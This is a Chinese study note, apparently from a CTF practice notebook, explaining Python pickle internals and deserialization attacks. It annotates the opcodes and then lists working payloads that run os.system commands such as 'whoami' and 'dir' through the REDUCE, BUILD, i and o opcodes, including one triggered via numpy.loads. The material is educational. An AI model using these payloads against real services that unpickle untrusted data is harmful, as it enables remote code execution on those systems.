# pickle

https://gitee.com/Cralwer/study-note/blob/master/CTF%E5%A4%8D%E7%8E%B0/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E8%B0%9C.md



## 0x01 意义

存储字符串不比你存储对象简单?

```python
import pickle

class dem0():
    data=20211230
    text = "Hello World"
    todo = ['test','text','abcd']
class dem1():
    def __init__(self):
       self.data=20211230
       self.text = "Hello World"
       self.todo = ['test','text','abcd'] 
print(pickle.dumps(dem0()))
print(pickle.dumps(dem1()))
```

输出:

```
b'\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04dem0\x94\x93\x94)\x81\x94.'`
b'\x80\x04\x95Y\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04dem1\x94\x93\x94)\x81\x94}\x94(\x8c\x04data\x94J\x1ef4\x01\x8c\x04text\x94\x8c\x0bHello World\x94\x8c\x04todo\x94]\x94(\x8c\x04test\x94h\x06\x8c\x04abcd\x94eub.'
```

所以大家记得写init(如果需要赋值的话)。

## 0x02 pickle.load

`_load`和`_loads`基本一致，都是把各自输入得到的东西作为文件流，喂给`_Unpickler`类；然后调用`_Unpickler.load()`实现反序列化。

![image-20211230214105950](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230214105950.png)

大哥总监的Unpickler中最重要的两个变量

![image-20211230214538893](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230214538893.png)

感觉有个小机器的感觉，其实就是利用这些都关系来能够最后成功反序列化。

## 0x03 反序列化分析

```python
import pickle,pickletools

class dem0():
    data=20211230
    text = "Hello World"
    todo = ['test','text','abcd']
class dem1():
    def __init__(self):
       self.data=20211230
       self.text = "Hello World"
       self.todo = ['test','text','abcd']
s=dem1()
x = pickle.dumps(s,protocol=1)
pickletools.dis(x)
```

这是一个小测试，我们可以在打印的内容中看到pickle反序列化之后的数据

```
b'\x80\x03c__main__\ndem1\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00dataq\x03J\x1ef4\x01X\x04\x00\x00\x00textq\x04X\x0b\x00\x00\x00Hello Worldq\x05X\x04\x00\x00\x00todoq\x06]q\x07(X\x04\x00\x00\x00testq\x08h\x04X\x04\x00\x00\x00abcdq\teub.'
```



```python
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ dem1'
   17: q    BINPUT     0
   19: )    EMPTY_TUPLE
   20: \x81 NEWOBJ
   21: q    BINPUT     1
   23: }    EMPTY_DICT
   24: q    BINPUT     2
   26: (    MARK
   27: X        BINUNICODE 'data'
   36: q        BINPUT     3
   38: J        BININT     20211230
   43: X        BINUNICODE 'text'
   52: q        BINPUT     4
   54: X        BINUNICODE 'Hello World'
   70: q        BINPUT     5
   72: X        BINUNICODE 'todo'
   81: q        BINPUT     6
   83: ]        EMPTY_LIST
   84: q        BINPUT     7
   86: (        MARK
   87: X            BINUNICODE 'test'
   96: q            BINPUT     8
   98: h            BINGET     4
  100: X            BINUNICODE 'abcd'
  109: q            BINPUT     9
  111: e            APPENDS    (MARK at 86) #extend list on stack by topmost stack slice
  112: u        SETITEMS   (MARK at 26)
  113: b    BUILD
  114: .    STOP
```

下面我们给他加注释:

`\x80 PROTO      3` 机器读到`\x80`后立马又读了一条数据`\x03` 知道版本号是3；

`c__main__\ndem1`c连续读取两个操作符，分别是`__main__`和`dem1`并且规定分解时`\n`,并且把他们压入栈中。`find_class `# `Subclasses may override this.`

`q  BINPUT` 先不考虑其用法

```
        BINPUT     0 Store the stack top into the memo.  The stack is not popped.
5: h    BINGET     0 Read an object from the memo and push it on the stack.
```

`)` 把一个空的tuple压入当前栈

`\x81` 从栈中先弹出一个元素，记为`args`；再弹出一个元素，记为`cls`接下来，执行`cls.__new__(cls, *args)` ，然后把得到的东西压进栈。说人话就是从栈中弹出一个参数和一个类，用这个参数来实例化类。

`}`把一个空的字典压入栈中

`(`mark字符他做的事情是`load_mark`

```python
def load_mark(self):
    self.metastack.append(self.stack)
    self.stack = []
    self.append = self.stack.append
dispatch[MARK[0]] = load_mark
```

```
把当前栈这个整体，作为一个list，压进前序栈。
把当前栈清空。
```

这个时候`pop_mark`出来了。

```
记录当前栈的信息，作为list返回
然后弹出前序栈的栈顶。覆盖当前栈
```

`x`意思是读入`BINUNICODE`，并且压入栈中。

 `J` 读入`BININT`，并且压入栈中。

`u` modify dict by adding topmost key+value pairs

`b`

```python
		stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, "__setstate__", None)
        if setstate is not None:
            setstate(state)
            return
```

这里如果`__setstate__`被赋值了是个命令执行函数就会导致命令执行出现。

## 0x04 `__reduce__`

`__reduce__`这个方法会告诉pickle如何序列化它。

这个方法对应的操作数是`R`，源码如下

```python
def load_reduce(self):
    stack = self.stack
    args = stack.pop()
    func = stack[-1]
    stack[-1] = func(*args)
    dispatch[REDUCE[0]] = load_reduce
```

可以看到这里进行的操作是，将栈顶的元素弹出作为参数，再弹出一个元素，作为方法。

```python
<class 'builtin_function_or_method'>
    0: \x80 PROTO      3
    2: c    GLOBAL     'nt system'
   13: X    BINUNICODE 'dir'
   21: \x85 TUPLE1
   22: R    REDUCE
   23: .    STOP
```

其中的模块是`c`调用find_class去全局寻找的，所以就算我们没有`import`

```python
    def find_class(self, module, name):
        # Subclasses may override this.
        sys.audit('pickle.find_class', module, name)
        if self.proto < 3 and self.fix_imports:
            if (module, name) in _compat_pickle.NAME_MAPPING:
                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
            elif module in _compat_pickle.IMPORT_MAPPING:
                module = _compat_pickle.IMPORT_MAPPING[module]
        __import__(module, level=0)
        if self.proto >= 4:
            return _getattribute(sys.modules[module], name)[0]
        else:
            return getattr(sys.modules[module], name)
```

源码里面也会去调用。修复很简单就是屏蔽它

```
genops(pickle)
   Generate all the opcodes in a pickle, as (opcode, arg, position) triples.
```

`然后关闭R操作数`

```python
class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,["ls"])# 未测试成功
```

## 0x05 没有`__reduce__`

用build指令，对于对象`__setstate__`如果传入的os.system，那么不就可以执行命令了。

抄一下师傅们的payload

这是正常的

```
b"\x80\x03c__main__\ndem1\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbX\x04\x00\x00\x00dir b."
```

**其他模块的load也可以触发pickle反序列化漏洞**

```python
import os,numpy
import pickle,pickletools

class dem0():
    data=20211230
    text = "Hello World"
    todo = ['test','text','abcd']
class dem1():
    def __init__(self,a):
        self.__setstate__=os.system
        # self.a=a
        # self.data=20211230
        # self.text = "Hello World"
        # self.todo = ['test','text','abcd']
s=dem1(1)
x = pickle.dumps(s,protocol=2)
x = pickletools.optimize(x)
pickletools.dis(x)
print(x)
x=b"\x80\x03c__main__\ndem1\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbX\x04\x00\x00\x00dir b."
numpy.loads(x)
'''
def loads(*args, **kwargs):
    # NumPy 1.15.0, 2017-12-10
    warnings.warn(
        "np.loads is deprecated, use pickle.loads instead",
        DeprecationWarning, stacklevel=2)
    return pickle.loads(*args, **kwargs)
'''
# pickletools.dis(x)
# pickle.loads(x)

```

R:

```text
b'''cos
system
(S'whoami'
tR.'''
```

i

```text
b'''(S'whoami'
ios
system
.'''
```

o

```text
b'''(cos
system
S'whoami'
o.'''
```
